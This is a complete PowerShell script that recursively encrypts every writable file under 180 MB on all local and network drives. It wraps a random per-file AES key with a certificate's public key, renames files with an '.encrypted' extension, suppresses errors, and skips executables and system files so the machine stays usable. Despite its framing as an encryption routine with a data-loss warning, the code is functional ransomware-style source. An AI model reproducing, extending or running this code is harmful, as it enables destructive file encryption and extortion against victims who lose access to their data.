#This is a PowerShell script that traverses your computers drives and encrypts files.
#It uses a randomly generated key which is encrypted with the public key certificate and added to the start of each file.
#This means the symmetric keys will be different for every file.
#The key appended to the start of each file is used to perform the symmetric encryption and encrypt the rest of the file with Rijndael Managed.
#The private key certificate is later used to decrypt the encrypted key at the start of each file, then that decrypted key is used to decrypt the rest of the file.
#This is asymmetric encryption blended with symmetric encryption.
#This is the encryption algorithm, the decryption algorithm will be in another file.
#Warning: Be careful using this script, it could lead to data loss and more.
[Reflection.Assembly]::LoadWithPartialName("System.Security")  

#Encryption routine:
function Encrypt($path)
{
$item = [System.IO.File]::ReadAllBytes($path)
$init = "init"

$key = New-Object byte[](32)
$rng = [System.Security.Cryptography.RNGCryptoServiceProvider]::Create()
$rng.GetBytes($key)

$r = new-Object System.Security.Cryptography.RijndaelManaged 
$r.Key = $key
$r.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash([Text.Encoding]::UTF8.GetBytes($init))[0..15] 
$r.padding = "PKCS7"
$r.mode = "CBC"
$c = $r.createencryptor()
$ms = new-Object IO.MemoryStream 
$cs = new-Object Security.Cryptography.CryptoStream $ms, $c, "Write" 
$cs.write($item, 0, $item.length)
$cs.close()
$ms.close()
$r.clear()
$fileKey = $cert.PublicKey.Key.Encrypt($key, $true)
if ($null -ne $key) { [array]::Clear($key, 0, $key.Length) }
[System.IO.File]::WriteAllBytes($path, $fileKey+$ms.toarray())
}
#Start of PowerShell script.
cls
cd c:\
write-host "Working . . ."
#Uses a certificate from the microsoft certificate store, replace the zeros with the public key certificate identifier.
$cert = get-item -path cert:\currentuser\my\0000000000000000000000000000000000000000 -ea stop
$ErrorActionPreference = "SilentlyContinue"
$user = [environment]::machinename+"\"+[environment]::username

foreach ($n in get-wmiobject win32_logicaldisk -filter "drivetype='3' or drivetype='4'" | select-object -expandproperty name)
{ 
#Does not encrypt executable files in this list, includes all other files.
foreach ($i in get-childitem $n -r -i @("*.*") -exclude @("*.exe","*.dll","*.cpl","*.ocx","*.sys","*.scr","*.drv","*.efi","*.fon","*.encrypted","*.lnk","*.pif","*.msi","*.com","*.cmd","*.bin","*.bat","*.job","*.reg","*.inf","*.ins","*.msc") | select-object -expandproperty fullname)
{
#Only encrypts files less than 180 mb, can change depending on your available resources.
if (((Get-Item $i).length -lt 180mb) -eq "True")
{
try {
$acl = Get-Acl $i -ea "Stop"
#Determines if the file can be overwritten.
ForEach ($z in $acl.access | ForEach-Object {($_.identityreference -eq $user) -and ($_.FileSystemRights -eq "FullControl")})
{
if ($z -eq "True")
{
write-host $i
#Do the encryption and rename.
Encrypt $i
[gc]::Collect()
$name = [System.IO.Path]::GetFileName($i)
rename-item $i $name".encrypted"
}
}
} catch {
#Error handling if necessary.
#write-host $i
}
}
}
}
#Print errors if this line is enabled.
#$error | Out-File "C:\FilePath\errors.txt"
write-host "Done."
start-sleep 120